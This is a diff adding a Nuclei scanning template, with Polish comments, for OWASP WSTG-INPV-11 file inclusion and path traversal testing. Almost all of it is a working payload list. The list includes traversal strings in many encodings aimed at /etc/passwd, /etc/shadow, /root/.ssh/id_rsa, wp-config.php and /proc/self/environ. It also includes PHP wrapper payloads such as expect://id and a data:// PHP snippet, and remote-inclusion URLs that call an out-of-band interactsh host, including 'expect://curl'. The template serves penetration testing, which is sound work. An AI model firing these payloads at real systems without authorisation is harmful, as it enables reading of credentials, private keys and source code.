@@ -1,0 +1,425 @@
+# ============================================================================
+# WSTG-INPV-11: Code Injection - LFI / RFI / Path Traversal (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (LFI/RFI). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Klasy podatności:
+#   ✓ Path Traversal (../, ..\, mixed)
+#   ✓ LFI - Local File Inclusion (PHP include, ASP/ASPX, JSP, ColdFusion)
+#   ✓ RFI - Remote File Inclusion (HTTP/FTP/data:)
+#   ✓ PHP Wrappers (php://filter, php://input, data://, expect://, phar://)
+#   ✓ Java/Servlet path bypass (..;/, %5c, %252f)
+#   ✓ Null-byte tail (%00) - legacy PHP < 5.3
+#
+# Cele wskaźnikowe (per OS):
+#   Linux:    /etc/passwd, /etc/hostname, /proc/self/environ
+#   Windows:  C:\Windows\win.ini, C:\boot.ini, %SystemRoot%\System32\drivers\etc\hosts
+#   macOS:    /etc/passwd, /etc/hostname
+#
+# Encoding warianty:
+#   ✓ Plain (../)
+#   ✓ URL encoded (%2e%2e%2f)
+#   ✓ Double URL encoded (%252e%252e%252f)
+#   ✓ Backslash variants (..\, %5c)
+#   ✓ Mixed slashes (..//)
+#   ✓ UTF-8 overlong (\xc0\xae)
+#   ✓ Unicode normalization (..%c0%2f)
+#
+# Performance budget: medium (~370 payloads × 5 części)
+# Estimated time: ~15-25 min na typowej aplikacji
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Directory Traversal/Intruder/* (deep + exotic)
+#   2. PayloadsAllTheThings/File Inclusion/* (Wrappers, LFI-to-RCE)
+#   3. seclists/Fuzzing/LFI/*
+# ============================================================================
+
+id: wstg-inpv-11-lfi-rfi
+
+info:
+  name: "WSTG-INPV-11: Local/Remote File Inclusion & Path Traversal (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa Path Traversal, Local File Inclusion (LFI), Remote File Inclusion (RFI)
+    oraz typowe PHP wrappery (php://filter, data:, expect:). Detekcja przez
+    rozpoznawanie zawartości typowych plików systemowych (/etc/passwd format,
+    win.ini sections) lub przez RFI/wrapper success markers.
+    Pokrywa Linux/Windows/macOS, encoding bypass (URL, double-URL, UTF-8 overlong),
+    i Java path bypass (..;/, %5c).
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+    - https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  classification:
+    cwe-id: CWE-22,CWE-98
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+  tags: dast,wstg,wstg-v42-inpv-11,lfi,rfi,path-traversal,asvs-v5.3.10,asvs-v12.3.1,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|zip|tar|gz|mp4|webm|mp3|wav)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Linux /etc/passwd - klasyczny path traversal
+        # Source: PayloadsAllTheThings/Directory Traversal/Intruder
+        # ====================================================================
+        - "/etc/passwd"
+        - "../etc/passwd"
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        - "../../../../../../../etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        - "../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../etc/passwd"
+        - "{{repeat(\"../\", 12)}}etc/passwd"
+        - "{{repeat(\"../\", 16)}}etc/passwd"
+        - "{{repeat(\"../\", 20)}}etc/passwd"
+        # Z prefix slashem (absolute-style)
+        - "/../../etc/passwd"
+        - "/../../../etc/passwd"
+        - "/../../../../etc/passwd"
+        - "/../../../../../etc/passwd"
+        # Trailing null byte (legacy PHP)
+        - "../../../../../etc/passwd%00"
+        - "../../../../../etc/passwd%00.jpg"
+        - "../../../../../etc/passwd%00.png"
+
+        # ====================================================================
+        # GROUP 2: URL/double-URL encoded traversal
+        # ====================================================================
+        - "..%2fetc%2fpasswd"
+        - "..%2f..%2fetc%2fpasswd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "%2e%2e%2fetc%2fpasswd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        # Double URL
+        - "%252e%252e%252fetc%252fpasswd"
+        - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+        - "..%252f..%252f..%252fetc%252fpasswd"
+        - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+        # Mixed
+        - "..%2f..%2f..%2f..%2f..%2fetc/passwd"
+        - "../%2e%2e/%2e%2e/etc/passwd"
+
+        # ====================================================================
+        # GROUP 3: UTF-8 overlong / Unicode normalization
+        # ====================================================================
+        - "..%c0%afetc%c0%afpasswd"
+        - "..%c1%9cetc%c1%9cpasswd"
+        - "..%c0%2fetc%c0%2fpasswd"
+        - "..%e0%80%afetc/passwd"
+
+        # ====================================================================
+        # GROUP 4: Windows targets (win.ini, hosts)
+        # ====================================================================
+        - "C:\\Windows\\win.ini"
+        - "C:/Windows/win.ini"
+        - "..\\..\\..\\Windows\\win.ini"
+        - "..\\..\\..\\..\\Windows\\win.ini"
+        - "..\\..\\..\\..\\..\\Windows\\win.ini"
+        - "..\\..\\..\\..\\..\\..\\Windows\\win.ini"
+        - "..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini"
+        - "{{repeat(\"..\\\\\", 10)}}Windows\\win.ini"
+        - "..%5c..%5c..%5cWindows%5cwin.ini"
+        - "..%5c..%5c..%5c..%5cWindows%5cwin.ini"
+        - "..%5c..%5c..%5c..%5c..%5cWindows%5cwin.ini"
+        - "%5c..%5c..%5c..%5cWindows%5cwin.ini"
+        - "..%252f..%252f..%252fWindows%252fwin.ini"
+        - "..%255c..%255c..%255cWindows%255cwin.ini"
+        # Boot.ini (legacy)
+        - "..\\..\\..\\boot.ini"
+        - "..\\..\\..\\..\\boot.ini"
+        - "..\\..\\..\\..\\..\\boot.ini"
+        # Hosts file
+        - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+        - "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
+        - "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
+        - "..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
+
+        # ====================================================================
+        # GROUP 5: PHP Wrappers (LFI → RCE / source disclosure)
+        # Source: PayloadsAllTheThings/File Inclusion/Wrappers.md
+        # ====================================================================
+        - "php://filter/convert.base64-encode/resource=index.php"
+        - "php://filter/convert.base64-encode/resource=/etc/passwd"
+        - "php://filter/read=convert.base64-encode/resource=index.php"
+        - "php://filter/read=convert.base64-encode/resource=config.php"
+        - "php://filter/convert.base64-encode/resource=../config.php"
+        - "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
+        - "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+        - "php://input"
+        - "data://text/plain,{{canary}}"
+        - "data://text/plain;base64,e2NhbmFyeX19"          # base64-encoded canary string
+        - "data:text/plain,{{canary}}"
+        - "expect://id"
+        - "phar:///tmp/test.phar/test.txt"
+        - "zip://archive.zip%23test.txt"
+        # PHP filter chain (PHP 7.4+)
+        - "php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/passwd"
+
+        # ====================================================================
+        # GROUP 6: Java path bypass (Tomcat ..;/  Servlet engines)
+        # Source: hacktricks Java traversal bypass
+        # ====================================================================
+        - "..;/etc/passwd"
+        - "..;/..;/etc/passwd"
+        - "..;/..;/..;/etc/passwd"
+        - "..;/..;/..;/..;/etc/passwd"
+        - "WEB-INF/web.xml"
+        - "../WEB-INF/web.xml"
+        - "../../WEB-INF/web.xml"
+        - "..;/WEB-INF/web.xml"
+        - "..;/..;/WEB-INF/web.xml"
+        - "..;/..;/..;/WEB-INF/web.xml"
+
+        # ====================================================================
+        # GROUP 7: /proc filesystem (Linux information disclosure)
+        # ====================================================================
+        - "/proc/self/environ"
+        - "/proc/self/cmdline"
+        - "/proc/self/status"
+        - "/proc/self/maps"
+        - "/proc/version"
+        - "/proc/cpuinfo"
+        - "../../../proc/self/environ"
+        - "../../../../proc/self/environ"
+        - "../../../../../proc/self/environ"
+        - "../../../../../../proc/self/environ"
+        - "../../../../../../proc/self/cmdline"
+
+        # ====================================================================
+        # GROUP 8: Application config files (common targets)
+        # ====================================================================
+        - "../../../../etc/hostname"
+        - "../../../../etc/issue"
+        - "../../../../etc/resolv.conf"
+        - "../../../../etc/shadow"            # require root - czesto FN ale warto
+        - "../../../../var/log/auth.log"
+        - "../../../../var/log/apache2/access.log"
+        - "../../../../var/log/nginx/access.log"
+        - "../../../../var/www/html/.htaccess"
+        - "../../../../var/www/html/wp-config.php"
+        - "../../../../home/.bash_history"
+        - "../../../../root/.bash_history"
+        - "../../../../root/.ssh/id_rsa"
+
+        # ====================================================================
+        # GROUP 9: Filter bypass tricks
+        # Source: PayloadsAllTheThings/File Inclusion + hacktricks
+        # ====================================================================
+        # Path normalization break
+        - "....//....//....//etc/passwd"
+        - "....//....//....//....//etc/passwd"
+        - "....\\....\\....\\Windows\\win.ini"
+        - ".../...//...//etc/passwd"          # deep dot bypass
+        # Mixed encodings
+        - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+        - "..%252f..%252f..%252fetc/passwd"
+        # Forward slash + backslash mixing
+        - "../..\\..\\../etc/passwd"
+        - "..\\../..\\..//etc/passwd"
+        # Trailing question mark
+        - "../../../../etc/passwd?"
+        - "../../../../etc/passwd?.jpg"
+        # Trailing #
+        - "../../../../etc/passwd#"
+        - "../../../../etc/passwd#.jpg"
+
+        # ====================================================================
+        # GROUP 10: RFI - Remote File Inclusion
+        # Wymaga że aplikacja PHP ma allow_url_include=On (rzadkie)
+        # ====================================================================
+        - "http://{{interactsh-url}}/{{canary}}.txt"
+        - "https://{{interactsh-url}}/{{canary}}.txt"
+        - "//{{interactsh-url}}/{{canary}}.txt"
+        - "ftp://{{interactsh-url}}/{{canary}}.txt"
+        - "http://{{interactsh-url}}/test.php"
+        - "http://{{interactsh-url}}/shell.php?{{canary}}"
+        # Bypass http:// filter z encoded prefix
+        - "hTTp://{{interactsh-url}}/{{canary}}.txt"
+        - "http:%2f%2f{{interactsh-url}}/{{canary}}.txt"
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: replace               # replace - LFI często wymaga zastąpienia całego value
+        mode: single
+        # LFI/RFI keys: file/path/include/page/template/doc itd.
+        # Plus brak filtra (fuzz wszystkie) - dla coverage
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - rozpoznaj zawartość plików systemowych
+      - type: regex
+        part: body
+        name: file-content-detected
+        regex:
+          # /etc/passwd format: user:x:UID:GID:gecos:home:shell
+          - "root:[x*]:0:0:"
+          - "daemon:[x*]:1:1:"
+          - "(?:bin|nobody|sshd|www-data|mail|uucp|adm):[x*]:\\d+:\\d+:"
+          # win.ini sections
+          - "(?i)\\[(extensions|fonts|mci extensions|files|mail|drivers32)\\]"
+          - "(?i); for 16-bit app support"
+          # boot.ini
+          - "\\[boot loader\\]"
+          - "\\[operating systems\\]"
+          # hosts file
+          - "127\\.0\\.0\\.1\\s+localhost"
+          - "::1\\s+localhost"
+          # /proc/version
+          - "Linux version \\d+\\.\\d+\\.\\d+"
+          # Java web.xml
+          - "<web-app[^>]*>"
+          - "<servlet>\\s*<servlet-name>"
+          # PHP wrapper base64 output (długi base64 string)
+          - "^[A-Za-z0-9+/=]{200,}$"
+          # PHP source disclosure markers
+          - "<\\?php"
+          - "<\\?="
+          # Apache/nginx config
+          - "<VirtualHost"
+          - "DocumentRoot\\s"
+          # SSH key marker (.ssh/id_rsa)
+          - "-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----"
+          # bash_history typical
+          - "(?:cd |ls |sudo |ssh |scp )"
+          # data: wrapper canary echo
+          - "{{canary}}"
+        condition: or
+
+      # Warstwa 2: SECONDARY - response status nie wskazuje na app error
+      - type: dsl
+        name: response-meaningful
+        dsl:
+          - "status_code != 404"
+          - "len(body) > 100"
+        condition: and
+
+      # Warstwa 3: ANTI-FP - nie WAF block
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      # Warstwa 4: ANTI-FP - timeout
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: regex
+        name: passwd-snippet
+        part: body
+        group: 0
+        regex:
+          - "(?:root|daemon|bin|nobody|sshd|www-data):[x*]:\\d+:\\d+:[^:]*:[^:]*:[^\\n]+"
+
+      - type: regex
+        name: detected-target
+        part: body
+        regex:
+          - "(?:\\[boot loader\\]|\\[fonts\\]|root:[x*]:0:0:|<web-app|-----BEGIN.{0,30}PRIVATE KEY-----)"
+
+  # ==========================================================================
+  # DRUGI BLOCK: RFI / wrapper-based OOB
+  # Klasyczny pattern blind RFI: include() pobiera attacker URL.
+  # Dodatkowo PHP expect:// / http:// wrappery, Java URL.openStream()
+  # itd. Callback do interactsh = include() / url-fetch wykonany.
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      rfi_oob:
+        # Plain RFI URL
+        - "http://{{interactsh-url}}/{{canary}}"
+        - "https://{{interactsh-url}}/{{canary}}"
+        - "//{{interactsh-url}}/{{canary}}"
+        # PHP wrappers
+        - "php://filter/convert.base64-encode/resource=http://{{interactsh-url}}/{{canary}}"
+        - "expect://curl%20http://{{interactsh-url}}/{{canary}}"
+        - "data://text/plain,<?php file_get_contents('http://{{interactsh-url}}/{{canary}}'); ?>"
+        # Null byte (legacy PHP < 5.3)
+        - "http://{{interactsh-url}}/{{canary}}%00"
+        - "http://{{interactsh-url}}/{{canary}}%00.php"
+        # FTP variant
+        - "ftp://{{interactsh-url}}/{{canary}}"
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{rfi_oob}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+          - "ftp"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - PHP wrappery wymagają PHP-specific app config (allow_url_include for RFI)
+# - php://filter/base64 wymaga że tester potem decoduje base64 - heurystyka
+#   "long base64 string" daje FP na legitne base64 contentów (np. obrazki)
+# - Aplikacje z chroot/jail mogą nie pokazać /etc/passwd mimo że LFI istnieje
+# - Aplikacje filtrujące dot-dot ale honorujące absolute paths - wykryjemy
+#   przez plain `/etc/passwd` bez `../`
+# ============================================================================
